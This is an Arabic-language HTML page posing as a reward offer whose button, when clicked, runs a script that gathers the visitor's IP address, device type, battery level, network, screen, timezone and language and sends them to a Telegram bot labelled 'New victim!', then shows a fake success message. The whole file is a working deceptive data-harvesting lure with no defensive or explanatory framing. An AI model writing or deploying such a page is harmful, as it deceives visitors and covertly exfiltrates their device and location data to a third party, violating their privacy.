<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً! اضغط للمتابعة</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; }
        button { background: #ff4757; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; transition: all 0.3s; }
        button:hover { background: #ff3742; transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 مرحباً بك!</h1>
        <p>اضغط الزر للحصول على المكافأة الخاصة بك</p>
        <button onclick="collectData()">اضغط هنا للمتابعة</button>
    </div>

    <script>
        async function collectData() {
            const data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                ip: 'جاري الاستخراج...',
                deviceType: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                battery: 'جاري الاستخراج...',
                network: 'جاري الاستخراج...'
            };

            // IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
            } catch(e) { data.ip = 'غير متاح'; }

            // Battery
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'شاحن' : 'بطارية'})`;
                } catch(e) { data.battery = 'غير متاح'; }
            }

            // Network
            if ('connection' in navigator) {
                const conn = navigator.connection;
                data.network = `${conn.effectiveType} (${conn.downlink} Mbps)`;
            }

            // إرسال لتليجرام
            const payload = {
                chat_id: '5493903521',
                text: `🕵️‍♂️ **ضحية جديدة!**\n\n` +
                      `🌐 **IP**: \`${data.ip}\`\n` +
                      `📱 **نوع الجهاز**: ${data.deviceType}\n` +
                      `🔋 **البطارية**: ${data.battery}\n` +
                      `📶 **الشبكة**: ${data.network}\n` +
                      `💻 **User Agent**: ${data.userAgent.substring(0,100)}...\n` +
                      `🖥️ **الشاشة**: ${data.screen}\n` +
                      `🌍 **المنطقة**: ${data.timezone}\n` +
                      `🗣️ **اللغة**: ${data.language}\n\n` +
                      `⏰ **الوقت**: ${new Date().toLocaleString('ar-SA')}`
            };

            fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            document.body.innerHTML = '<h1 style="color:green;text-align:center;">تم بنجاح! شكراً لك 😊</h1>';
        }
    </script>
</body>
</html>
